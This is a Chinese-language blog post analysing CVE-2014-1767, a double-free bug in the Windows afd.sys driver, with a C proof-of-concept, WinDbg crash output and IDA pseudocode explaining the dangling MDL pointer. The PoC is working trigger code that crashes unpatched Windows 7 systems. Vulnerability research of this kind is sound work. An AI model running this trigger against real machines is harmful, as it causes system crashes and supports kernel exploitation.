# CVE-2014-1767 - 五千年木 - 博客园

> 原文：[`www.cnblogs.com/elvirangel/p/8465690.html`](https://www.cnblogs.com/elvirangel/p/8465690.html)

### **[0x00].简介 **

CVE-2014-1767 漏洞是由于 Windows 的 afd.sys 驱动在对系统内存的管理操作中，存在着悬垂指针的问题。在特定情况下攻击者可以通过该悬垂指针造成内存的 double free 漏洞。

测试环境：

|   | 推荐环境 | 备注 |
| 虚拟机环境 | Win 7 | 32 位 |
| 编译器 | VC6.0 |   |
| 调试器 | Windbg |   |
| 反编译器 | IDA pro |   |

###  [0x01].漏洞分析

 首先在 VC6 上编译以下用于触发漏洞的 poc 代码，然后在虚拟机中运行生成的 poc.exe.同时挂载内核调试器进行分析

```
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, “WS2_32.lib”)

int main()
{
    DWORD targetSize = 0×310 ;
    DWORD virtualAddress = 0×13371337 ;
    DWORD mdlSize=(0×4000*(targetSize-0×30)/8)-0xFFF-(virtualAddress& 0xFFF) ;
    static DWORD inbuf1[100] ;
    memset(inbuf1, 0, sizeof(inbuf1)) ;
    inbuf1[6]  = virtualAddress ;
    inbuf1[7]  = mdlSize ;
    inbuf1[10] = 1 ;
    static DWORD inbuf2[100] ;
    memset(inbuf2, 0, sizeof(inbuf2)) ;
    inbuf2[0] = 1 ;
    inbuf2[1] = 0x0AAAAAAA ;
    WSADATA      WSAData ;
    SOCKET       s ;
    sockaddr_in  sa ;
    int          ierr ;
    WSAStartup(0×2, &WSAData) ;
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) ;
    memset(&sa, 0, sizeof(sa)) ;
    sa.sin_port = htons(135) ;   
    sa.sin_addr.S_un.S_addr = inet_addr(“127.0.0.1″) ;
    sa.sin_family = AF_INET ; 
    ierr = connect(s, (const struct sockaddr *)&sa, sizeof(sa)) ;
    static char outBuf[100] ;
    DWORD bytesRet ;
    DeviceIoControl((HANDLE)s, 0x1207F, (LPVOID)inbuf1, 0×30, outBuf, 0, &bytesRet, NULL);
    DeviceIoControl((HANDLE)s, 0x120C3, (LPVOID)inbuf2, 0×18, outBuf, 0, &bytesRet, NULL);
    return 0 ;
}

```

POC 主要做了这么两件事：

```
1\. 初始化了一个本地 socket 连接。

2\. 给这个 socket 发送了两个控制码：0x1207F 和 0x120C3。
```

运行后系统崩溃，在 Windbg 调试器断下

```
kd> !analyze -v
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

BAD_POOL_CALLER (c2)
The current thread is making a bad pool request.  Typically this is at a bad IRQL level or double freeing the same allocation, etc.
Arguments:
Arg1: 00000007, Attempt to free pool which was already freed
Arg2: 0000109b, (reserved)
Arg3: 08bd0004, Memory contents of the pool block
Arg4: 87686218, Address of the block of pool being deallocated

Debugging Details:
------------------

POOL_ADDRESS:  87686218 Nonpaged pool

FREED_POOL_TAG:  Mdl 

BUGCHECK_STR:  0xc2_7_Mdl 

DEFAULT_BUCKET_ID:  VISTA_DRIVER_FAULT

PROCESS_NAME:  poc.exe

CURRENT_IRQL:  2

LAST_CONTROL_TRANSFER:  from 83f1a08f to 83eb6110

STACK_TEXT:  
a899154c 83f1a08f 00000003 ef6507c2 00000065 nt!RtlpBreakWithStatusInstruction
a899159c 83f1ab8d 00000003 87686210 000001ff nt!KiBugCheckDebugBreak+0x1c
a8991960 83f5bc6b 000000c2 00000007 0000109b nt!KeBugCheck2+0x68b
a89919d8 83ec7eb2 87686218 00000000 87677c48 nt!ExFreePoolWithTag+0x1b1
a89919ec 9085ceb0 87686218 00000000 9083f89f nt!IoFreeMdl+0x70
a8991a08 9083f8ac 00000000 00000001 381a49ac afd!AfdReturnTpInfo+0xad
a8991a44 90840bba 381a4904 000120c3 90840a8c afd!AfdTliGetTpInfo+0x89
a8991aec 908452bc 87678c90 869b2848 a8991b14 afd!AfdTransmitPackets+0x12e
a8991afc 83e72593 869b2848 86c63160 86c63160 afd!AfdDispatchDeviceControl+0x3b
a8991b14 8406598f 87678c90 86c63160 86c6323c nt!IofCallDriver+0x63
a8991b34 84068b61 869b2848 87678c90 00000000 nt!IopSynchronousServiceTail+0x1f8
a8991bd0 840af3fc 869b2848 86c63160 00000000 nt!IopXxxControlFile+0x6aa
a8991c04 83e791ea 00000050 00000000 00000000 nt!NtDeviceIoControlFile+0x2a
a8991c04 777c70b4 00000050 00000000 00000000 nt!KiFastCallEntry+0x12a
0012fc8c 777c5864 75b6989d 00000050 00000000 ntdll!KiFastSystemCallRet
0012fc90 75b6989d 00000050 00000000 00000000 ntdll!NtDeviceIoControlFile+0xc
0012fcf0 771aa671 00000050 000120c3 00427c50 KERNELBASE!DeviceIoControl+0xf6
0012fd1c 00401186 00000050 000120c3 00427c50 kernel32!DeviceIoControlImplementation+0x80
WARNING: Stack unwind information not available. Following frames may be wrong.
0012ff48 004013b9 00000001 006e0de8 006e0e40 poc+0x1186
0012ff88 771b3c45 7ffd4000 0012ffd4 777e37f5 poc+0x13b9
0012ff94 777e37f5 7ffd4000 7795f253 00000000 kernel32!BaseThreadInitThunk+0xe
0012ffd4 777e37c8 004012d0 7ffd4000 00000000 ntdll!__RtlUserThreadStart+0x70
0012ffec 00000000 004012d0 7ffd4000 00000000 ntdll!_RtlUserThreadStart+0x1b

STACK_COMMAND:  kb

FOLLOWUP_IP: 
afd!AfdReturnTpInfo+ad
9085ceb0 ff45fc          inc     dword ptr [ebp-4]

```

目前，我们可以知道：

```
出问题的是 afd.sys 模块，漏洞的类型为 double free，free 的对象是 Mdl，并且发生崩溃时存在这样的调用关系：

afd!AfdTransmitPackets->afd!AfdTliGetTpInfo->afd!AfdReturnTpInfo->nt!IoFreeMdl
```

根据上面加粗的提示可以知道，由于此处重复释放一块已经释放的内存，导致双重释放（double free）才引发崩溃。在 poc 中，程序两次调用 DeviceIoControl,分别向 IO 控制码**0x1207F**和**0x120C3**发送数据，因此我们直接从这两个 IO 控制码的分发函数入手。

要找到这个对应关系，有这样的调试技巧：用户层的 IoControl 消息到都会被内核包装成 IRP 包，发送给对应驱动的 IRP_MJ_DEVICE_CONTROL 例程来处理，IRP_MJ_DEVICE_CONTROL 例程会根据控制码来选择对应的函数。

Windbg 为我们提供了这样的功能：

```
kd> !drvobj AFD 2
Driver object (869b23c8) is for:
 \Driver\AFD
DriverEntry:   9086863d	afd!GsDriverEntry
DriverStartIo: 00000000	
DriverUnload:  9083d5b6	afd!AfdUnload
AddDevice:     00000000	

Dispatch routines:
[00] IRP_MJ_CREATE                      90847190	afd!AfdDispatch
[01] IRP_MJ_CREATE_NAMED_PIPE           90847190	afd!AfdDispatch
[02] IRP_MJ_CLOSE                       90847190	afd!AfdDispatch
[03] IRP_MJ_READ                        90847190	afd!AfdDispatch
[04] IRP_MJ_WRITE                       90847190	afd!AfdDispatch
[05] IRP_MJ_QUERY_INFORMATION           90847190	afd!AfdDispatch
[06] IRP_MJ_SET_INFORMATION             90847190	afd!AfdDispatch
[07] IRP_MJ_QUERY_EA                    90847190	afd!AfdDispatch
[08] IRP_MJ_SET_EA                      90847190	afd!AfdDispatch
[09] IRP_MJ_FLUSH_BUFFERS               90847190	afd!AfdDispatch
[0a] IRP_MJ_QUERY_VOLUME_INFORMATION    90847190	afd!AfdDispatch
[0b] IRP_MJ_SET_VOLUME_INFORMATION      90847190	afd!AfdDispatch
[0c] IRP_MJ_DIRECTORY_CONTROL           90847190	afd!AfdDispatch
[0d] IRP_MJ_FILE_SYSTEM_CONTROL         90847190	afd!AfdDispatch
[0e] IRP_MJ_DEVICE_CONTROL              90845281	afd!AfdDispatchDeviceControl
[0f] IRP_MJ_INTERNAL_DEVICE_CONTROL     90825831	afd!AfdWskDispatchInternalDeviceControl

```

　这样就可以得到 afd.sys 对应的 IRP_MJ_DEVICE_CONTROL 例程为 afd!AfdDispatchDeviceControl，利用 IDA 对该函数简单分析后，其大致流程如下：

```
PAGEAFD:000314C9 ; int __stdcall AfdDispatchDeviceControl(int, PIRP Irp)
PAGEAFD:000314C9 _AfdDispatchDeviceControl@8 proc near   ; CODE XREF: AfdDispatch(x,x)+3C↓p
PAGEAFD:000314C9                                         ; DATA XREF: DriverEntry(x,x)+2FA↓o
PAGEAFD:000314C9
PAGEAFD:000314C9 Irp             = dword ptr  0Ch
PAGEAFD:000314C9
PAGEAFD:000314C9                 mov     edi, edi
PAGEAFD:000314CB                 push    ebp
PAGEAFD:000314CC                 mov     ebp, esp
PAGEAFD:000314CE                 mov     ecx, [ebp+Irp]  ; Irp
PAGEAFD:000314D1                 mov     edx, [ecx+60h]  ; edx = IrpStackLocation
PAGEAFD:000314D4                 push    esi
PAGEAFD:000314D5                 push    edi
PAGEAFD:000314D6                 mov     edi, [edx+0Ch]  ; edi = DeviceIoControl 的控制码
PAGEAFD:000314D9                 mov     eax, edi
PAGEAFD:000314DB                 shr     eax, 2          ; IoControl>>2
PAGEAFD:000314DE                 and     eax, 3FFh       ; 将控制码的高位都清零，这样就只剩下 IoControl 的功能号了
PAGEAFD:000314E3                 cmp     eax, 46h
PAGEAFD:000314E6                 jnb     short loc_31506
PAGEAFD:000314E8                 mov     esi, eax
PAGEAFD:000314EA                 shl     esi, 2
PAGEAFD:000314ED                 cmp     ds:_AfdIoctlTable[esi], edi
PAGEAFD:000314F3                 jnz     short loc_31506
PAGEAFD:000314F5                 mov     [edx+1], al
PAGEAFD:000314F8                 mov     esi, ds:_AfdIrpCallDispatch[esi]
PAGEAFD:000314FE                 test    esi, esi
PAGEAFD:00031500                 jz      short loc_31506
PAGEAFD:00031502                 call    esi             ; 调用控制码对应的函数

```

#### 1.IO 控制码 0x1207F

为了跟踪 Io 控制码 0x1207F 对应的处理函数，首先在 Windbg 中针对 afd!AfdDispatchDeviceControl 设置条件断点，当其在处理 io 控制码 0x1207F 时断下。

```
kd> ba e1 afd!AfdDispatchDeviceControl+10 ".if(@edi==0x1207F){}.else{gc}"
kd> g

afd!AfdDispatchDeviceControl+0x39:
9065d2ba ffd6            call    esi
kd> t
afd!AfdTransmitFile:
```

可以看到当 IOCTL 为 0x1207F 时，afd 驱动中的 AfdTransmitFile 函数会被调用

AfdTransmitFile 函数原型为

```
AfdTransmitFile（pIRP,pIoStackLocation）

```

```
pIRP 各字段含义
```

```
kd> dt _IRP
ntdll!_IRP
   +0x000 Type             : Int2B
   +0x002 Size             : Uint2B
   +0x004 MdlAddress       : Ptr32 _MDL
   +0x008 Flags            : Uint4B
   +0x00c AssociatedIrp    : <unnamed-tag>
   +0x010 ThreadListEntry  : _LIST_ENTRY
   +0x018 IoStatus         : _IO_STATUS_BLOCK
   +0x020 RequestorMode    : Char
   +0x021 PendingReturned  : UChar
   +0x022 StackCount       : Char
   +0x023 CurrentLocation  : Char
   +0x024 Cancel           : UChar
   +0x025 CancelIrql       : UChar
   +0x026 ApcEnvironment   : Char
   +0x027 AllocationFlags  : UChar
   +0x028 UserIosb         : Ptr32 _IO_STATUS_BLOCK
   +0x02c UserEvent        : Ptr32 _KEVENT
   +0x030 Overlay          : <unnamed-tag>
   +0x038 CancelRoutine    : Ptr32     void 
   +0x03c UserBuffer       : Ptr32 Void
   +0x040 Tail             : <unnamed-tag>
```

```
pIoStackLocation 各字段含义
```

```
kd> dt _IO_STACK_LOCATION
ntdll!_IO_STACK_LOCATION
   +0x000 MajorFunction    : UChar
   +0x001 MinorFunction    : UChar
   +0x002 Flags            : UChar
   +0x003 Control          : UChar
   +0x004 Parameters       : <unnamed-tag>
   +0x014 DeviceObject     : Ptr32 _DEVICE_OBJECT
   +0x018 FileObject       : Ptr32 _FILE_OBJECT
   +0x01c CompletionRoutine : Ptr32     long 
   +0x020 Context          : Ptr32 Void

//Paramaters for IRP_MJ_DEVICE_CONTROL
struct{
        ULONG OutputBufferLength;
        ULONG POINTER_ALIGNMENT InputBufferLength;
        ULONG POINTER_ALIGNMENT IoControlCode;
        PVOID Type3InputBuffer;
}DeviceIoControl;
```

在 ida 里查看 AfdTransmitFile 函数

```
v2 = pIoStackLocation;
  v64 = pIoStackLocation;
  v3 = pIRP;
  v62 = pIRP;
  Entry = 0;
  v70 = 0;
  v69 = 0;
  v4 = *(_DWORD *)(*(_DWORD *)(pIoStackLocation + 0x18) + 0xC); //FsContext
  v63 = v4;
  if ( *(_WORD *)v4 == 0x1AFD ) //FsContext != 0x1AFD,防止跳转
  {
    v68 = -1073741574;
    goto LABEL_97;
  }
  if ( *(_DWORD *)(v2 + 8) < 0x30u ) //InputbufferLength >= 0x30 ,防止跳转
  {
    v68 = -1073741811;
    goto LABEL_97;
  }
  v68 = 0;
  ms_exc.registration.TryLevel = 0;
  if ( *(_BYTE *)(pIRP + 0x20) ) //RequestorMode
  {
    v5 = *(_DWORD *)(v2 + 0x10);
    if ( v5 & 3 ) //Type3InputBuffer & 3 == 0 ,防止跳转
      ExRaiseDatatypeMisalignment();
    if ( v5 >= AfdUserProbeAddress )
      v5 = AfdUserProbeAddress;
    v6 = *(_BYTE *)v5;
  }
  qmemcpy(&v45, *(const void **)(v64 + 0x10), 0x30u);
//v54 = v45 + 0x28, Handle = v45 + 0x14, v46 = v45 + 0x4
//因此只有当 (Type3InputBuffer + 0x28) & 0xFFFFFFC8 == 0 ， （Type3InputBuffer + 0x28） & 0x30 != 48 , Type3InputBuffer + 0x4 >= 0,就不会跳转
  if ( v54 & 0xFFFFFFC8 || (v54 & 0x30) == 48 || Handle && v46 < 0 )
  {
    v68 = -1073741811;
    goto LABEL_96;
  }
  if ( !(v54 & 0x30) ) //
    v54 |= AfdDefaultTransmitWorker;
  if ( *(_DWORD *)(v4 + 8) & 0x200 )
    v7 = AfdTliGetTpInfo(3u); //从函数调用栈可知 AfdTliGetTpInfo 函数被调用
```

接着看 AfdTliGetTpInfo 函数

```
_DWORD *__fastcall AfdTliGetTpInfo(unsigned int a1)
{
  unsigned int v1; // edi
  _DWORD *tpinfo; // eax
  _DWORD *v3; // esi

  v1 = a1;
//从 non-paged 链节点里分配内存，返回 TpInfo 结构指针
  tpinfo = ExAllocateFromNPagedLookasideList((PNPAGED_LOOKASIDE_LIST)&AfdGlobalData[6].ContentionCount);
  v3 = tpinfo;
  if ( !tpinfo )
    return 0;
//设置 Tpinfo 结构数据
  tpinfo[2] = 0;
  tpinfo[3] = 0;
  tpinfo[4] = tpinfo + 3;
  tpinfo[5] = 0;
  tpinfo[6] = tpinfo + 5;
  tpinfo[13] = 0;
  *((_BYTE *)tpinfo + 51) = 0;
  tpinfo[9] = 0;
  tpinfo[11] = -1;
  tpinfo[15] = 0;
  tpinfo[1] = 0;
//v1 > 3，之后都称 v1 为 TpInfoElementCount
  if ( v1 > AfdDefaultTpInfoElementCount )
  {
//TpInfoElement 结构大小为 0x18
//将分配后的 pTpInfoElement 指针存在 tpinfo+0x20 的位置
    tpinfo[8] = ExAllocatePoolWithQuotaTag((POOL_TYPE)16, 0x18 * v1, 0xC6646641);
    *((_BYTE *)v3 + 50) = 1;
  }
  return v3;
}
```

继续回到 AfdTransmitFile 函数中

```
if ( *(_DWORD *)(v4 + 8) & 0x200 )
    v7 = AfdTliGetTpInfo(3u);
  else
    v7 = (_DWORD *)AfdTdiGetTpInfo(3);
 v8 = v7;//v8,v7 都指向 tpinfo 结构
  Entry = v7;
  if ( !v7 )
    goto LABEL_21;
 v9 = v7 + 10;//v9 = tpinfo + 0xA
  v66 = v9;
  *v9 = 0;
  v10 = v8 + 14;
  v59 = v10;
  v11 = v48;
  *v10 = v48;
  if ( v11 )
    v69 = 1;
  else
    *v10 = AfdTransmitIoLength;//tpinfo + 0xE = AfdTransmitIoLength
  v12 = Length;
  if ( Length )
  {
//可以看出 v66 为 TpInfoElementIndex,所以用来乘以 TpinfoElemnet 结构大小 0x18
//因此 v65 就是指向具体的 TpinfoElement 数组元素
    v13 = *v66;
    v65 = (_DWORD *)(v8[8] + 24 * *v66);
    v14 = v65;
    *v66 = v13 + 1;
    v15 = VirtualAddress;
 v14[2] = VirtualAddress;//TpinfoElemnet + 8 = VirtualAddress
    v14[1] = v12;//TpinfoElement + 4 = Length
    *v14 = 1;
    if ( v54 & 0x10 )
    {
      *v14 = -2147483647;
 v16 = IoAllocateMdl(v15, v12, 0, 1u, 0);
      v14[3] = v16;//TpinfoElement + 0xc = pMDL,指向分配的 Mdl
      if ( !v16 )
        goto LABEL_21;
 MmProbeAndLockPages(v16, *(_BYTE *)(v3 + 32), 0);//锁定内存
    }
  }

```

根据前面的分析，我们可以大致绘制出 Tpinfo 和 TpInfoElement 的数据结构

![](img/a97f3f30e990ad8acb9df9b2f4164202.png)

在 AfdTransmitFile 函数调用完 IoAllocateMdl 分配完内存后，单步跟踪下去，它会调用 MmProAndLockPages 去锁定内存范围 0x13371000~0x13371000+0x16ecca(均是由 Poc 中的代码设置的值）

该范围属于无效范围，因此会触发异常。

触发异常后，程序会调用 AfdReturnTpInfo 函数，在该函数中，由于在是否 MDL 资源后，未对 TpInfoElement + 0xC 指针做清除处理，导致其成为“悬挂指针”。

```
void __stdcall AfdReturnTpInfo(PVOID Entry, char a2)
{
... ...
        v6 = *(_DWORD *)(v4 + 12);
        if ( v6 )
        {
          if ( *(_BYTE *)(v6 + 6) & 2 )
            MmUnlockPages(*(PMDL *)(v4 + 12));
          IoFreeMdl(*(PMDL *)(v4 + 0xC));
        }
... ...
}

```

如果此时 AfdReturnTpInfo 函数再被调用，那么悬挂指针 TpInfoElement + 0xC 将会被 IoFreeMdl 函数再 free 一遍，最终造成“double free”双重释放漏洞

####  2.IO 控制码 0x120C3

继续下条件断点，追踪 Io 控制码 0x120C3 对应的处理函数，可以发现它调用的是 AfdTransmitPackets 函数，

```
kd> kb
ChildEBP RetAddr  Args to Child              
a1f77a08 8a5b98ac 87feb358 00000001 2bad8e95 afd!AfdReturnTpInfo
a1f77a44 8a5babba 2bad8e3d 000120c3 8a5baa8c afd!AfdTliGetTpInfo+0x89
a1f77aec 8a5bf2bc 87d4ee10 8692c5d0 a1f77b14 afd!AfdTransmitPackets+0x12e
a1f77afc 83e55593 8692c5d0 87f31b10 87f31b10 afd!AfdDispatchDeviceControl+0x3b

```

```
afd!AfdTransmitPackets 函数的两个参数分别是 pIRP 和 pIoStackLocation,在 ida 中对其进行分析
```

```
 __fastcall AfdTransmitPackets(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    IoStack->InputBufferLength >= 0×10
    IoStack->Type3InputBuffer & 3 == 0
    IoStack->Type3InputBuffer < 0x7fff0000
    memcpy(tempBuf, IoStack->Type3InputBuffer, 0×10);
    *(DWORD*)(tempBuf+0x0C) & 0xFFFFFFF8 == 0
    *(DWORD*)(tempBuf+0x0C) & 0×30 != 0×30
    *(DWORD*)(tempBuf) != 0
    *(DWORD*)(tempBuf+4) != 0
    *(DWORD*)(tempBuf+4) <= 0x0AAAAAAA

    // 以上条件关系全部成立则控制流达到此处，
    // 用户输入 可以控制 申请的 TpElement 数目 ！！！
    AfdTliGetTpInfo( *(DWORD*)(tempBuf+4) )
}

```

关于 AfdTliGetTpinfo 函数，前面已经逆向分析过，它会调用 ExAllocatePoolWithQuotaTag 分配*（Type3InputBuffer + 4）个 TpinfoElement 所需要的内存。在 poc 中设置为 0x0AAAAAAA,而每个 TpInfoElement 结构占 0x18 字节，因此共需要申请内存 0xFFFFFFF0,这么大的内存申请在 32 位系统上不会成功，会触发异常再次进入 AfdReturnTpInfo 函数中。

AfdReturnTpInfo 函数会再次释放 Mdl 结构，可以发现它此时释放的正是之前释放的那个，由此造成 Double Free 漏洞

### [0x02].总结

整个漏洞的流程如下。

POC 创建了一个以 socket 为基础的本地网络连接，调用 DeviceIoControl 向 socket 对象分别发送两个控制码 0x1207F 和 0x120C3，这两次控制码分别对应 afd.sys 的 AfdTransmitFile 和 AfdTransmitPackets。

**IOControl=0x1207F**

1\. AfdTransmitFile 会调用 AfdTliGetTpInfo 来获得一个 TpInfo 结构

2. 接着 AfdTransmitFile 根据用户层传递过来的 VirtualAddress=0x13371337 和 Length 来创建一个 Mdl，用来和用户层交互，并将这个 Mdl 的地址保存到 TpInfo 结构中的 TpElementArray 数组中。

3\. AfdTransmitFile 接着调用 MmProbeAndLockPages 函数，准备对申请的 Mdl 进行操作，但是由于无效的地址(VirtualAddress=0x13371337)，程序进入到异常处理的流程中。

4. 异常处理流程会调用 AfdReturnTpInfo 函数，AfdReturnTpInfo 函数遍历 TpInfo 结构的 TpElementArray 数组，将 Mdl 释放掉。接着其会调用 ExFreeToNPagedLookasideList 释放刚创建的 TpInfo。

5. 但是因为此时这个 Lookaside 很"闲"，ExFreeToNPagedLookasideList 不会将 TpInfo 释放掉，而是将其挂载到 Dedicated Lookaside List 中去。但此时 TpInfo 所在 pool 数据还保留着，并没有清空，当然也包括已经释放掉的 Mdl 地址，成了一个 dangling pointer，这里就埋下了隐患。这是第一次 free 的地方。

第一次 IoControl 的操作主要就是放置一个 dangling pointer 到 Lookaside Lists 中。

第二次 IoControl 对这个 dangling pointer 进行二次释放。

**IOControl=0x120C3**

1. 接下来 AfdTransmitPackets 同样会调用 AfdTliGetTpInfo 创建一个 TpInfo 结构。AfdTliGetTpInfo 会调用 ExAllocateFromNPagedLookasideList。因为此时的 Lookaside Lists 不为空，所以会从中卸载一个 ListEntry 给 TpInfo 使用，而此时 Lookaside 就只有一个上一次 AfdTransmitFile 函数放入的 ListEntry，所以这个 ListEntry 正好是响应上一个控制码所放进去的那个！

2. 接着 AfdTliGetTpInfo 会从用户层输入 inbuf2[1]获得值 0x0AAAAAAA，作为 TpElementCount，接下来会创建一个 0x0AAAAAAA*0x18=0xFFFFFFF0 大小的 pool,这显然太大了，所以会再一次的进去到异常处理的操作。

3. 异常处理会调用 AfdReturnTpInfo，其会遍历 TpInfo 尝试释放掉 Mdl。因为此时的 TpInfo 所在的 pool 正是" dangling pointer"，而 Mdl 已经被释放过一次了，这时发生 double-free。

4. 然后发生 BSOD。